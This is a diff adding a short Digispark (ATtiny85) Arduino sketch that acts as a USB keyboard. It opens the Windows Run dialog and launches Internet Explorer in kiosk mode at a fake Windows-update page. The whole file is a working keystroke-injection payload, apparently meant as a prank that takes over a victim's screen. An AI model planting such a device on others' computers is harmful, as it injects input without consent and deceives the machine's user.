@@ -1,0 +1,12 @@
+#include "DigiKeyboard.h"
+
+void setup() {}
+
+void loop() {
+	DigiKeyboard.sendKeyStroke(0);
+	DigiKeyboard.delay(3000);
+	DigiKeyboard.sendKeyStroke(0, MOD_GUI_LEFT,KEY_R);
+	DigiKeyboard.delay(500);
+	DigiKeyboard.print("iexplore -k http://fakeupdate.net/win10/index.html");
+	DigiKeyboard.sendKeyStroke(KEY_ENTER);
+}
